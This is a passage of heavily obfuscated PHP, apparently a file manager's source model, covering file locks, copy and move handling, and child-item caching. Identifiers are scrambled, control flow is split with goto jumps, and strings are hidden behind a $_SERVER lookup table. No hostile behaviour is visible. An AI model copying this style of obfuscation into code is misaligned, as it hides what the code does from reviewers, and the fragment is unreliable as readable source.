$BÅºÈÄôœ[519]), $D”Á©‡¶—–); $this->_lockParent($aê©©‰ê¥Å, array($BÅºÈÄôœ[519]), $D”Á©‡¶—–); goto a•¿’…ŠÆš; Eö­æÚ¼†œ: } public function lockCopyEnd($b†ÖÙÂîÊÎ) { $EøğõË¾Õ =& $_SERVER[´¬]; if (!$this->allowLock()) { return; } $d¹öÓ¥»Éé = 0; $this->_lockEvent($b†ÖÙÂîÊÎ, array($EøğõË¾Õ[518], $EøğõË¾Õ[519]), $d¹öÓ¥»Éé); $this->_lockParent($b†ÖÙÂîÊÎ, array($EøğõË¾Õ[519]), $d¹öÓ¥»Éé); $this->_lockEvent($b†ÖÙÂîÊÎ, array($EøğõË¾Õ[520], $EøğõË¾Õ[521]), $d¹öÓ¥»Éé); } public function lockWriteStart($Aù²š¢½®, $DìŒÎÚãš = '') { goto däêéĞé±®; däêéĞé±®: $BŠ‡Ğ•À‘ =& $_SERVER[´¬]; if (!$this->allowLock()) { return; } $this->_lockCheck($BŠ‡Ğ•À‘[518], $Aù²š¢½®); goto BŠÊ¸í¬ŠŞ; BŠÊ¸í¬ŠŞ: $AÛåùèœëš = 1; $this->_lockKey($BŠ‡Ğ•À‘[522] . $Aù²š¢½® . $BŠ‡Ğ•À‘[95] . $DìŒÎÚãš, $AÛåùèœëš); $this->_lockEvent($Aù²š¢½®, array($BŠ‡Ğ•À‘[517], $BŠ‡Ğ•À‘[519]), $AÛåùèœëš); goto aŠ†ÀÇ‹ô; aŠ†ÀÇ‹ô: $this->_lockParent($Aù²š¢½®, array($BŠ‡Ğ•À‘[517], $BŠ‡Ğ•À‘[519]), $AÛåùèœëš); $this->_lockCheckEnd($BŠ‡Ğ•À‘[518], $Aù²š¢½®); goto aù‘–Æ·ä; aù‘–Æ·ä: } public function lockWriteEnd($b‹ÓäÍùÛ†, $c»µÛÊîå„ = '') { $AŒ‚²Û¦–» =& $_SERVER[´¬]; if (!$this->allowLock()) { return; } $fŠÎà–…ø = 0; $this->_lockKey($AŒ‚²Û¦–»[522] . $b‹ÓäÍùÛ† . $AŒ‚²Û¦–»[95] . $c»µÛÊîå„, $fŠÎà–…ø); $this->_lockEvent($b‹ÓäÍùÛ†, array($AŒ‚²Û¦–»[517], $AŒ‚²Û¦–»[519]), $fŠÎà–…ø); $this->_lockParent($b‹ÓäÍùÛ†, array($AŒ‚²Û¦–»[517], $AŒ‚²Û¦–»[519]), $fŠÎà–…ø); } public function lockMoveStart($cöÂ¶‚›¾¶) { goto d…ˆØİåŒ; a²ĞßéÙØ: $this->_lockParent($cöÂ¶‚›¾¶, array($c¾³Ã§–¬å[517], $c¾³Ã§–¬å[519]), $aŠåÂŠğ); $this->_lockEvent($cöÂ¶‚›¾¶, array($c¾³Ã§–¬å[524], $c¾³Ã§–¬å[520], $c¾³Ã§–¬å[521]), $aŠåÂŠğ); $this->_lockCheckEnd($c¾³Ã§–¬å[519], $cöÂ¶‚›¾¶); goto Dæê²†¹ÔÃ; b”ÂÖïİ•: $aŠåÂŠğ = 1; $this->_lockKey($c¾³Ã§–¬å[523] . $cöÂ¶‚›¾¶, $aŠåÂŠğ); $this->_lockEvent($cöÂ¶‚›¾¶, array($c¾³Ã§–¬å[517], $c¾³Ã§–¬å[518]), $aŠåÂŠğ); goto a²ĞßéÙØ; d…ˆØİåŒ: $c¾³Ã§–¬å =& $_SERVER[´¬]; if (!$this->allowLock()) { return; } $this->_lockCheck($c¾³Ã§–¬å[519], $cöÂ¶‚›¾¶); goto b”ÂÖïİ•; Dæê²†¹ÔÃ: } public function lockMoveEnd($A‘‡¬Ä®É§) { goto a™å›¬ÀÕ; a™å›¬ÀÕ: $dßåç—î‘Ñ =& $_SERVER[´¬]; if (!$this->allowLock()) { return; } $c“ŠŒ¿ñ‹ì = 0; goto d†‚Í‡›¼š; d†‚Í‡›¼š: $this->_lockKey($dßåç—î‘Ñ[523] . $A‘‡¬Ä®É§, $c“ŠŒ¿ñ‹ì); $this->_lockEvent($A‘‡¬Ä®É§, array($dßåç—î‘Ñ[517], $dßåç—î‘Ñ[518]), $c“ŠŒ¿ñ‹ì); $this->_lockParent($A‘‡¬Ä®É§, array($dßåç—î‘Ñ[517], $dßåç—î‘Ñ[519]), $c“ŠŒ¿ñ‹ì); goto CŠÙÁÓ‹ïõ; CŠÙÁÓ‹ïõ: $this->_lockEvent($A‘‡¬Ä®É§, array($dßåç—î‘Ñ[524], $dßåç—î‘Ñ[520], $dßåç—î‘Ñ[521]), $c“ŠŒ¿ñ‹ì); goto C Æå¦ºñ¹; C Æå¦ºñ¹: } private function _lockCheck($FÅ‘ùÏİÉÑ, $B¨ëè¤‘ö) { goto D Üô“Œä; f˜»ö½ŒÖ: CacheLock::setErrorMsg($e‰½®ö³ƒÆ[160] . htmlspecialchars($DŠŸà˜‰…Œ[$e‰½®ö³ƒÆ[28]]) . $e‰½®ö³ƒÆ[503] . $DŠ™Şïèö); $this->_lockKey($B¢÷Æ¶¬šÅ, 1); $this->_lockKey($B¢÷Æ¶¬šÅ, 0); goto b¤Ïò¤ç›Â; D Üô“Œä: $e‰½®ö³ƒÆ =& $_SERVER[´¬]; $DŠŸà˜‰…Œ = $this->sourceInfo($B¨ëè¤‘ö); $B¢÷Æ¶¬šÅ = $FÅ‘ùÏİÉÑ . $e‰½®ö³ƒÆ[95] . $B¨ëè¤‘ö; goto CËó÷‰–ë®; CËó÷‰–ë®: $this->_lockTimeStart[$B¢÷Æ¶¬šÅ] = timeFloat(); if (!is_array($DŠŸà˜‰…Œ)) { return; } $DŠ™Şïèö = LNG($e‰½®ö³ƒÆ[525]); goto f˜»ö½ŒÖ; b¤Ïò¤ç›Â: $B‡ÛŸ«·· = array_reverse($this->parentLevelArray($DŠŸà˜‰…Œ[$e‰½®ö³ƒÆ[485]])); foreach ($B‡ÛŸ«·· as $Eº¬‘´²·¾) { $B¢÷Æ¶¬šÅ = $FÅ‘ùÏİÉÑ . $e‰½®ö³ƒÆ[526] . $Eº¬‘´²·¾; if (CacheLock::lockGet($e‰½®ö³ƒÆ[527] . $B¢÷Æ¶¬šÅ)) { $DŠŸà˜‰…Œ = $this->sourceInfo($Eº¬‘´²·¾); CacheLock::setErrorMsg($e‰½®ö³ƒÆ[160] . htmlspecialchars($DŠŸà˜‰…Œ[$e‰½®ö³ƒÆ[28]]) . $e‰½®ö³ƒÆ[503] . $DŠ™Şïèö); $this->_lockKey($B¢÷Æ¶¬šÅ, 1); $this->_lockKey($B¢÷Æ¶¬šÅ, 0); } } goto C¥Ô³–Ô‹; C¥Ô³–Ô‹: } private function _lockCheckEnd($e‡Á«¶É›Ø, $eÍ™ÅŸÈ‘–) { goto AÓºöº»ì¦; AÓºöº»ì¦: $FÌÛ¤‡™˜ =& $_SERVER[´¬]; $c—ÛÁ‚…— = $e‡Á«¶É›Ø . $FÌÛ¤‡™˜[95] . $eÍ™ÅŸÈ‘–; CacheLock::setErrorMsg($FÌÛ¤‡™˜[374]); goto eƒ–ÏÜƒƒ; eƒ–ÏÜƒƒ: if (!isset($this->_lockTimeStart[$c—ÛÁ‚…—])) { return; } $D»›‘±÷ = timeFloat() - $this->_lockTimeStart[$c—ÛÁ‚…—]; unset($this->_lockTimeStart[$c—ÛÁ‚…—]); goto C²º¦Æ°™á; C²º¦Æ°™á: if ($D»›‘±÷ > 0.5) { unset(self::$cacheSourceInfo[$FÌÛ¤‡™˜[436] . $eÍ™ÅŸÈ‘–]); } $d„¬×á‹î¢ = $this->sourceInfo($eÍ™ÅŸÈ‘–); if (!$d„¬×á‹î¢) { show_json(LNG($FÌÛ¤‡™˜[105]), !1); } goto bğ»õãô§; bğ»õãô§: } private function _lockParent($EÑï•éšè–, $fÀê…ÅŸ¸, $AáĞ‰óÓ) { if (!$this->autoLockSet) { return; } $AËĞŸÒ…‡ = $this->sourceInfo($EÑï•éšè–); if (!is_array($AËĞŸÒ…‡)) { return; } $d°Ï«ášöö = array_reverse($this->parentLevelArray($AËĞŸÒ…‡[$_SERVER[´¬][485]])); foreach ($d°Ï«ášöö as $eƒ±¡­»‹) { $this->_lockEvent($eƒ±¡­»‹, $fÀê…ÅŸ¸, $AáĞ‰óÓ); } } private function _lockEvent($D¶ÃÚ»ãã, $eŠáÜÓØÂ’, $c„ã¥øŠ’â) { $F´„†Ö”§â =& $_SERVER[´¬]; if (!$this->autoLockSet) { return; } foreach ($eŠáÜÓØÂ’ as $e¾óÛøÉœ¡) { $D¥°Ñä = $e¾óÛøÉœ¡ . $F´„†Ö”§â[95] . $D¶ÃÚ»ãã; if ($c„ã¥øŠ’â && CacheLock::lockGet($F´„†Ö”§â[527] . $D¥°Ñä)) { continue; } $this->_lockKey($D¥°Ñä, $c„ã¥øŠ’â); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($DÙ‰Ğ¡†Ğ×, $aµÁÓë©Ü¨ = 1) { $D¥î‚ƒ†Çñ = $_SERVER[´¬][527] . md5($DÙ‰Ğ¡†Ğ×); if ($aµÁÓë©Ü¨) { if (isset(self::$_lockItemArr[$D¥î‚ƒ†Çñ])) { return; } self::$_lockItemArr[$D¥î‚ƒ†Çñ] = 1; CacheLock::lock($D¥î‚ƒ†Çñ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$D¥î‚ƒ†Çñ])) { return; } unset(self::$_lockItemArr[$D¥î‚ƒ†Çñ]); CacheLock::unlock($D¥î‚ƒ†Çñ); } } public function isParentOf($f¼¦ˆ×ŞÙ¥, $FõÛ¶ºŠ†©) { goto aÎ”¸í–£¤; aÎ”¸í–£¤: $F–ôÛÃ—Š =& $_SERVER[´¬]; $Bº›¯†Ô“« = $this->sourceInfo($f¼¦ˆ×ŞÙ¥); $dŠ½¾°£‘Á = $this->sourceInfo($FõÛ¶ºŠ†©); goto eĞÜ´†¹Ø; eĞÜ´†¹Ø: $bÒ­Ÿµ“É = $Bº›¯†Ô“«[$F–ôÛÃ—Š[485]] . $Bº›¯†Ô“«[$F–ôÛÃ—Š[394]] . $F–ôÛÃ—Š[47]; $eÅÉ¬¨§˜ = $dŠ½¾°£‘Á[$F–ôÛÃ—Š[485]] . $dŠ½¾°£‘Á[$F–ôÛÃ—Š[394]] . $F–ôÛÃ—Š[47]; $cëĞñ›¿¶¨ = strpos($eÅÉ¬¨§˜, $bÒ­Ÿµ“É) === 0; goto AÊ¶©²òš; AÊ¶©²òš: return $cëĞñ›¿¶¨; goto fèğ¹á®–µ; fèğ¹á®–µ: } private $targetIsDelete = 0; public function copy($DÇÓâ©«, $CàÓ´¨ØÃÙ, $fï÷áÏÛ¥ = REPEAT_REPLACE, $D÷”å«ß÷³ = '') { goto DšÒ·êµª‹; bò¿¼ïàÑè: $this->saveAll($dÇŒóğÚ£[$A™ÕŠ·•°Ñ[530]]); Model($A™ÕŠ·•°Ñ[192])->linkAdd($dÇŒóğÚ£[$A™ÕŠ·•°Ñ[528]]); $this->folderSizeReset($CàÓ´¨ØÃÙ); goto C¾…ÚÍ¼®; aåƒŠø§Ó: $this->_childrenListClear(); $this->lockCopyEnd($DÇÓâ©«); $this->lockWriteEnd($CàÓ´¨ØÃÙ, $A’ÄŒìÅë); goto bê‰ŠÓ‹Ç¢; cƒÖŸÃ˜§«: $this->targetIsDelete = intval($B«åè”…[$A™ÕŠ·•°Ñ[421]]); $bÊ¸³ƒ‡§¯ = $this->fileNameExistCache($CàÓ´¨ØÃÙ, $B«åè”…[$A™ÕŠ·•°Ñ[28]]); $aÏ‹ÕĞ×¡ = $this->_copy($DÇÓâ©«, $CàÓ´¨ØÃÙ, $fï÷áÏÛ¥, $dÇŒóğÚ£, !0, $D÷”å«ß÷³); goto aåƒŠø§Ó; DšÒ·êµª‹: $A™ÕŠ·•°Ñ =& $_SERVER[´¬]; $B«åè”… = $this->sourceInfo($DÇÓâ©«); $cÏâ–Á¯ªí = $this->sourceInfo($CàÓ´¨ØÃÙ); goto e‰œ—½ĞŠ; d“âà°²: $this->lockCopyStart($DÇÓâ©«); $this->lockWriteStart($CàÓ´¨ØÃÙ, $A’ÄŒìÅë); $dÇŒóğÚ£ = array($A™ÕŠ·•°Ñ[528] => array(), $A™ÕŠ·•°Ñ[529] => array(), $A™ÕŠ·•°Ñ[530] => array()); goto cƒÖŸÃ˜§«; e‰œ—½ĞŠ: if (!$B«åè”… || !$cÏâ–Á¯ªí || $cÏâ–Á¯ªí[$A™ÕŠ·•°Ñ[401]] != $A™ÕŠ·•°Ñ[87]) { return !1; } if ($this->isParentOf($DÇÓâ©«, $CàÓ´¨ØÃÙ)) { return !1; } $A’ÄŒìÅë = $D÷”å«ß÷³ ? $D÷”å«ß÷³ : $B«åè”…[$A™ÕŠ·•°Ñ[28]]; goto d“âà°²; C¾…ÚÍ¼®: $this->updateModifyTime($CàÓ´¨ØÃÙ); return $aÏ‹ÕĞ×¡; goto c°£¤ÕŒš; bê‰ŠÓ‹Ç¢: if ($B«åè”…[$A™ÕŠ·•°Ñ[401]] == $A™ÕŠ·•°Ñ[87] && $bÊ¸³ƒ‡§¯ == $aÏ‹ÕĞ×¡) { $this->folderSizeResetChildren($bÊ¸³ƒ‡§¯); } Model($A™ÕŠ·•°Ñ[531])->addAll($dÇŒóğÚ£[$A™ÕŠ·•°Ñ[529]], array(), !0); if ($bÊ¸³ƒ‡§¯ != $aÏ‹ÕĞ×¡ || $B«åè”…[$A™ÕŠ·•°Ñ[401]] == $A™ÕŠ·•°Ñ[87]) { Model($A™ÕŠ·•°Ñ[532])->eventCopy($aÏ‹ÕĞ×¡); } goto bò¿¼ïàÑè; c°£¤ÕŒš: } private function _copy($D–´îä’ãè, $aÄ£ßí¿…, $c²óØßÙ…, &$aöìõÅóª›, $c…†—¨·è, $C´æ–®Î³È = '') { goto c¶¿á‰–Çà; bÓœ§‡â’Û: if (!$fß«ŠÃìõ‚) { return $this->_copyCreate($D–´îä’ãè, $aÄ£ßí¿…, $BÍò¥Ñ¦‚Í, $aöìõÅóª›); } $FÂ£…É„³ = $fß«ŠÃìõ‚; if ($BåæøÈ·‹) { if ($c²óØßÙ… == REPEAT_RENAME_FOLDER) { $BÍò¥Ñ¦‚Í = $this->fileNameAutoCache($aÄ£ßí¿…, $BÍò¥Ñ¦‚Í, $c²óØßÙ…, $BåæøÈ·‹); $FÂ£…É„³ = $this->_copyCreate($D–´îä’ãè, $aÄ£ßí¿…, $BÍò¥Ñ¦‚Í, $aöìõÅóª›); } else { $Eå¡‰ë¨½ = $this->_childrenList($D–´îä’ãè); foreach ($Eå¡‰ë¨½ as $B°‰Œ·Ñ’) { $this->_copy($B°‰Œ·Ñ’[$A©¨µ©¸Ã‰[394]], $fß«ŠÃìõ‚, $c²óØßÙ…, $aöìõÅóª›, !1); } } } else { if ($c²óØßÙ… == REPEAT_RENAME || $c²óØßÙ… == REPEAT_RENAME_FOLDER) { $BÍò¥Ñ¦‚Í = $this->fileNameAutoCache($aÄ£ßí¿…, $BÍò¥Ñ¦‚Í, $c²óØßÙ…, $BåæøÈ·‹); $FÂ£…É„³ = $this->_copyCreate($D–´îä’ãè, $aÄ£ßí¿…, $BÍò¥Ñ¦‚Í, $aöìõÅóª›); } else { if ($c²óØßÙ… == REPEAT_REPLACE) { $Fà¯× ‘Ô² = $this->sourceInfoCache($fß«ŠÃìõ‚); $DÄ¨¶¬ç—½ = $this->fileHistory($Fà¯× ‘Ô², $d¥ëÉ†…ôì[$A©¨µ©¸Ã‰[445]], $d¥ëÉ†…ôì[$A©¨µ©¸Ã‰[78]]); if ($DÄ¨¶¬ç—½) { $aöìõÅóª›[$A©¨µ©¸Ã‰[528]][] = $d¥ëÉ†…ôì[$A©¨µ©¸Ã‰[445]]; } } else { if ($c²óØßÙ… == REPEAT_SKIP) { } } } Hook::trigger($A©¨µ©¸Ã‰[533], array($A©¨µ©¸Ã‰[534], $d¥ëÉ†…ôì, 0)); } goto DÃ’ó­ç; DÃ’ó­ç: return $FÂ£…É„³; goto FìÜ‘îâªÑ; B‚‚ÕäÉ¢¶: $BÍò¥Ñ¦‚Í = $C´æ–®Î³È ? $C´æ–®Î³È : $d¥ëÉ†…ôì[$A©¨µ©¸Ã‰[28]]; $fß«ŠÃìõ‚ = $this->fileNameExistCache($aÄ£ßí¿…, $BÍò¥Ñ¦‚Í); if ($c…†—¨·è) { $this->_childrenAllMake($D–´îä’ãè); if ($BåæøÈ·‹ && $fß«ŠÃìõ‚) { $this->_childrenAllMake($fß«ŠÃìõ‚); } } goto bÓœ§‡â’Û; c¶¿á‰–Çà: $A©¨µ©¸Ã‰ =& $_SERVER[´¬]; $d¥ëÉ†…ôì = $this->sourceInfoCache($D–´îä’ãè); $BåæøÈ·‹ = $d¥ëÉ†…ôì[$A©¨µ©¸Ã‰[401]] == $A©¨µ©¸Ã‰[87]; goto B‚‚ÕäÉ¢¶; FìÜ‘îâªÑ: } private function _copyCreate($DÑöõ¿„îï, $AÂÅ¥—š°¸, $DÛŸ®ôªÆÌ, &$aÛ‚Ó¡ÒÓñ) { goto E¡†‡Æ£á; FƒóŒòöæ: $this->addAll($a¯·—ÜÜª, array(), !1); $DÊ†…Ô«… = $this->where(array($FÓñ›·ÎÑ[476] => $dåß…ĞÊ¾))->select(); $e÷¤Ÿö«İÌ = $this->_childrenMakeRelation($f††È×“ÔÇ, $DÊ†…Ô«…); goto E¸æ‹¸†¡¬; E¸æ‹¸†¡¬: $e÷¤Ÿö«İÌ[$DÑöõ¿„îï] = $dåß…ĞÊ¾; $F¶½™Ï• = array(); $FÁù¿¨ªí = array(); goto BÇ›ÊÃ£›”; E¡†‡Æ£á: $FÓñ›·ÎÑ =& $_SERVER[´¬]; $a†„¢Š¾§‘ = $this->sourceInfoCache($DÑöõ¿„îï); $Cœö‰Ø·¿Ò = $this->sourceInfoCache($AÂÅ¥—š°¸); goto CòÜİµ¶¡; b›ÕÎÕ¬¤Š: $this->_childrenListAll($DÑöõ¿„îï, $f††È×“ÔÇ); $E÷¾íæ±³® = count($f††È×“ÔÇ); if ($E÷¾íæ±³® == 0) { return $dåß…ĞÊ¾; } goto A¿…£‰º¶İ; CòÜİµ¶¡: $E¦ª›çñ“Ù = $this->_makeItemData($a†„¢Š¾§‘, $Cœö‰Ø·¿Ò, $DÛŸ®ôªÆÌ); Hook::trigger($FÓñ›·ÎÑ[535], $E¦ª›çñ“Ù); Hook::trigger($FÓñ›·ÎÑ[536], array($FÓñ›·ÎÑ[537], $E¦ª›çñ“Ù, 0)); goto b„¥ÕïËí¨; A¿…£‰º¶İ: $dÀêì‹‘„Û = $this->sourceInfo($dåß…ĞÊ¾); foreach ($f††È×“ÔÇ as $F¸éò¹ó÷î) { $Bš„Îîê÷ = $this->_makeItemData($F¸éò¹ó÷î, $dÀêì‹‘„Û, $F¸éò¹ó÷î[$FÓñ›·ÎÑ[28]]); $Bš„Îîê÷[$FÓñ›·ÎÑ[485]] = $F¸éò¹ó÷î[$FÓñ›·ÎÑ[485]]; $a¯·—ÜÜª[] = $Bš„Îîê÷; } $this->chunkEventSet($FÓñ›·ÎÑ[538], array($FÓñ›·ÎÑ[539], $E¦ª›çñ“Ù, $E÷¾íæ±³®)); goto FƒóŒòöæ; Cø¾Ñ×«¨Ç: $this->chunkEventSet($FÓñ›·ÎÑ[542], array($FÓñ›·ÎÑ[543], $E¦ª›çñ“Ù, $E÷¾íæ±³®)); $this->saveAll($FÁù¿¨ªí); return $dåß…ĞÊ¾; goto cÌ©ì³çÏ; b„¥ÕïËí¨: $dåß…ĞÊ¾ = $this->add($E¦ª›çñ“Ù); $b®×³Íçí› = array($FÓñ›·ÎÑ[394] => $dåß…ĞÊ¾, $FÓñ›·ÎÑ[28] => $DÛŸ®ôªÆÌ); $this->_copyApplyMeta($b®×³Íçí›, $aÛ‚Ó¡ÒÓñ); goto C²õ—ò«í; BÇ›ÊÃ£›”: foreach ($DÊ†…Ô«… as $F¸éò¹ó÷î) { $cËªÒ‘Ğ®© = $F¸éò¹ó÷î[$FÓñ›·ÎÑ[394]]; $EÙ¡âêô‡Ö = $this->_childrenMatch($e÷¤Ÿö«İÌ, $F¸éò¹ó÷î, $dÀêì‹‘„Û); $F¶½™Ï•[] = array($FÓñ›·ÎÑ[394], $cËªÒ‘Ğ®©, $FÓñ›·ÎÑ[476], $EÙ¡âêô‡Ö[$FÓñ›·ÎÑ[476]]); $FÁù¿¨ªí[] = array($FÓñ›·ÎÑ[394], $cËªÒ‘Ğ®©, $FÓñ›·ÎÑ[485], $EÙ¡âêô‡Ö[$FÓñ›·ÎÑ[485]]); $this->_copyApplyMeta($F¸éò¹ó÷î, $aÛ‚Ó¡ÒÓñ); if ($F¸éò¹ó÷î[$FÓñ›·ÎÑ[401]] != $FÓñ›·ÎÑ[87]) { $aÛ‚Ó¡ÒÓñ[$FÓñ›·ÎÑ[528]][] = $F¸éò¹ó÷î[$FÓñ›·ÎÑ[445]]; } } $this->chunkEventSet($FÓñ›·ÎÑ[540], array($FÓñ›·ÎÑ[541], $E¦ª›çñ“Ù, $E÷¾íæ±³®)); $this->saveAll($F¶½™Ï•); goto Cø¾Ñ×«¨Ç; C²õ—ò«í: if ($a†„¢Š¾§‘[$FÓñ›·ÎÑ[401]] != $FÓñ›·ÎÑ[87]) { $aÛ‚Ó¡ÒÓñ[$FÓñ›·ÎÑ[528]][] = $a†„¢Š¾§‘[$FÓñ›·ÎÑ[445]]; return $dåß…ĞÊ¾; } $f††È×“ÔÇ = array(); $a¯·—ÜÜª = array(); goto b›ÕÎÕ¬¤Š; cÌ©ì³çÏ: } private function _childrenMakeRelation($AÁ¢ŞËòù¬, $Cô×šŠŸ«¥) { $f‚šƒ×Äß” =& $_SERVER[´¬]; $eÏª§­íÂŞ = array(); $d‡³êÛ´¿ = array(); foreach ($AÁ¢ŞËòù¬ as $a‰–ÃÑƒğ›) { $Bí…§¤‘Õ = $a‰–ÃÑƒğ›[$f‚šƒ×Äß”[28]] . $f‚šƒ×Äß”[8] . $a‰–ÃÑƒğ›[$f‚šƒ×Äß”[485]]; $eÏª§­íÂŞ[$Bí…§¤‘Õ] = $a‰–ÃÑƒğ›[$f‚šƒ×Äß”[394]]; } foreach ($Cô×šŠŸ«¥ as $a‰–ÃÑƒğ›) { $Bí…§¤‘Õ = $a‰–ÃÑƒğ›[$f‚šƒ×Äß”[28]] . $f‚šƒ×Äß”[8] . $a‰–ÃÑƒğ›[$f‚šƒ×Äß”[485]]; $A¬“ì¶­í² = $eÏª§­íÂŞ[$Bí…§¤‘Õ]; $d‡³êÛ´¿[$A¬“ì¶­í²] = $a‰–ÃÑƒğ›[$f‚šƒ×Äß”[394]]; } return $d‡³êÛ´¿; } private function _childrenMatch($E§ŞáÚ»™, $c¡ä·Ïõ¨·, $dáôŸ„±ÁÆ) { goto D¯òĞˆˆÜ¥; BôßÁ¯Ä‘: foreach ($b›Š¦–‹´Ô as $Dí´÷“É´Õ) { if (isset($E§ŞáÚ»™[$Dí´÷“É´Õ])) { $b¬¾Â¾ÏÁ¯ .= $E§ŞáÚ»™[$Dí´÷“É´Õ] . $cÔĞ³˜¼Õ[544]; } } $b¬¾Â¾ÏÁ¯ = rtrim($b¬¾Â¾ÏÁ¯, $cÔĞ³˜¼Õ[47]) . $cÔĞ³˜¼Õ[47]; $DÁˆìÅ‡­« = $this->parentLevelArray($b¬¾Â¾ÏÁ¯); goto dğ—Öæ¼³; D¯òĞˆˆÜ¥: $cÔĞ³˜¼Õ =& $_SERVER[´¬]; $b¬¾Â¾ÏÁ¯ = $dáôŸ„±ÁÆ[$cÔĞ³˜¼Õ[485]]; $b›Š¦–‹´Ô = $this->parentLevelArray($c¡ä·Ïõ¨·[$cÔĞ³˜¼Õ[485]]); goto BôßÁ¯Ä‘; dğ—Öæ¼³: $Aš½‘‹Ïè§ = $DÁˆìÅ‡­«[count($DÁˆìÅ‡­«) - 1]; return array($cÔĞ³˜¼Õ[476] => $Aš½‘‹Ïè§, $cÔĞ³˜¼Õ[485] => $b¬¾Â¾ÏÁ¯); goto fãÅçãÇšá; fãÅçãÇšá: } private function _makeItemData($D©çŠç¼„‘, $eÍ¬ÉãÆºé, $båä‰£Ã‡Ò) { $DÜÁƒ’ª‘ =& $_SERVER[´¬]; $c‰±Ö“îÛ = array($DÜÁƒ’ª‘[545] => $D©çŠç¼„‘[$DÜÁƒ’ª‘[401]], $DÜÁƒ’ª‘[411] => $båä‰£Ã‡Ò, $DÜÁƒ’ª‘[546] => $D©çŠç¼„‘[$DÜÁƒ’ª‘[403]], $DÜÁƒ’ª‘[446] => $D©çŠç¼„‘[$DÜÁƒ’ª‘[445]], $DÜÁƒ’ª‘[547] => $D©çŠç¼„‘[$DÜÁƒ’ª‘[78]], $DÜÁƒ’ª‘[548] => $eÍ¬ÉãÆºé[$DÜÁƒ’ª‘[402]], $DÜÁƒ’ª‘[549] => $eÍ¬ÉãÆºé[$DÜÁƒ’ª‘[482]], $DÜÁƒ’ª‘[550] => USER_ID, $DÜÁƒ’ª‘[551] => USER_ID, $DÜÁƒ’ª‘[393] => $eÍ¬ÉãÆºé[$DÜÁƒ’ª‘[394]], $DÜÁƒ’ª‘[552] => $eÍ¬ÉãÆºé[$DÜÁƒ’ª‘[485]] . $eÍ¬ÉãÆºé[$DÜÁƒ’ª‘[394]] . $DÜÁƒ’ª‘[47], $DÜÁƒ’ª‘[415] => $D©çŠç¼„‘[$DÜÁƒ’ª‘[84]], $DÜÁƒ’ª‘[420] => 0, $DÜÁƒ’ª‘[553] => $DÜÁƒ’ª‘[33]); return $c‰±Ö“îÛ; } private function _copyApplyMeta($bÔâ¨ÏÍšÏ, &$E÷ËØğÎÖ) { $aæó„ÚÕÜ¾ =& $_SERVER[´¬]; $AÕîÅ“Üø = $bÔâ¨ÏÍšÏ[$aæó„ÚÕÜ¾[394]]; $eòåÈì®· = $bÔâ¨ÏÍšÏ[$aæó„ÚÕÜ¾[28]]; if (!isset($bÔâ¨ÏÍšÏ[$aæó„ÚÕÜ¾[554]]) || !$bÔâ¨ÏÍšÏ[$aæó„ÚÕÜ¾[554]] || $bÔâ¨ÏÍšÏ[$aæó„ÚÕÜ¾[554]] == $aæó„ÚÕÜ¾[495]) { $E÷ËØğÎÖ[$aæó„ÚÕÜ¾[530]][] = array($aæó„ÚÕÜ¾[394], $AÕîÅ“Üø, $aæó„ÚÕÜ¾[554], short_id($AÕîÅ“Üø)); } if (Input::check($eòåÈì®·, $aæó„ÚÕÜ¾[555])) { $E÷ËØğÎÖ[$aæó„ÚÕÜ¾[529]][] = array($aæó„ÚÕÜ¾[394] => $AÕîÅ“Üø, $aæó„ÚÕÜ¾[93] => $aæó„ÚÕÜ¾[442], $aæó„ÚÕÜ¾[371] => str_replace($aæó„ÚÕÜ¾[50], $aæó„ÚÕÜ¾[33], Pinyin::encode($eòåÈì®·))); $E÷ËØğÎÖ[$aæó„ÚÕÜ¾[529]][] = array($aæó„ÚÕÜ¾[394] => $AÕîÅ“Üø, $aæó„ÚÕÜ¾[93] => $aæó„ÚÕÜ¾[441], $aæó„ÚÕÜ¾[371] => Pinyin::encode($eòåÈì®·, $aæó„ÚÕÜ¾[556])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($eŒ“Ãóœ¤«) { goto C¯Ü„‹Ç¬ô; AÊ¯ùœ—ƒ: $fÓº”¯±ğ = array_to_keyvalue($fÓº”¯±ğ, $E×Š¿ÌÛÈè[394]); foreach ($fÓº”¯±ğ as $dÌÍ¼‹â™¿) { $f¨ˆó¾ÈÚ¨ = $dÌÍ¼‹â™¿[$E×Š¿ÌÛÈè[476]]; $eŒ“Ãóœ¤« = $dÌÍ¼‹â™¿[$E×Š¿ÌÛÈè[394]]; if (!isset($this->_childrenListCache[$eŒ“Ãóœ¤«]) && $dÌÍ¼‹â™¿[$E×Š¿ÌÛÈè[401]] == $E×Š¿ÌÛÈè[87]) { $this->_childrenListCache[$eŒ“Ãóœ¤«] = array(); } if (!isset($this->_childrenListCache[$f¨ˆó¾ÈÚ¨])) { $this->_childrenListCache[$f¨ˆó¾ÈÚ¨] = array(); } $this->_childrenListCache[$f¨ˆó¾ÈÚ¨][$eŒ“Ãóœ¤«] = $dÌÍ¼‹â™¿; $this->_childrenItemCache[$eŒ“Ãóœ¤«] = $dÌÍ¼‹â™¿; } goto e›ÊÖ¦ÒïÜ; C¯Ü„‹Ç¬ô: $E×Š¿ÌÛÈè =& $_SERVER[´¬]; $E…ÖÃØ…•ª = $this->sourceInfo($eŒ“Ãóœ¤«); $a…ñãœ»•Í = $E×Š¿ÌÛÈè[422]; goto a¶‰å¬†øÄ; a¶‰å¬†øÄ: $d‹Í¹ŞÎ²¿ = array($E×Š¿ÌÛÈè[485] => array($E×Š¿ÌÛÈè[511], $E…ÖÃØ…•ª[$E×Š¿ÌÛÈè[485]] . $eŒ“Ãóœ¤« . $E×Š¿ÌÛÈè[512]), $E×Š¿ÌÛÈè[421] => $this->targetIsDelete); $fÓº”¯±ğ = $this->field($a…ñãœ»•Í)->where($d‹Í¹ŞÎ²¿)->select(); if (!$fÓº”¯±ğ) { return; } goto AÊ¯ùœ—ƒ; e›ÊÖ¦ÒïÜ: } private function _childrenListAll($BšçéËÓĞ‹, &$f³õ©À²Ñ) { $E«ºÛƒ­“Ä =& $_SERVER[´¬]; if (!isset($this->_childrenListCache[$BšçéËÓĞ‹])) { return; } $aÉµ½•£¦Ë = $this->_childrenListCache[$BšçéËÓĞ‹]; foreach ($aÉµ½•£¦Ë as $c¥é–³µİ± => $Bàºå‰¶÷©) { $f³õ©À²Ñ[$c¥é–³µİ±] = $Bàºå‰¶÷©; if ($Bàºå‰¶÷©[$E«ºÛƒ­“Ä[401]] == 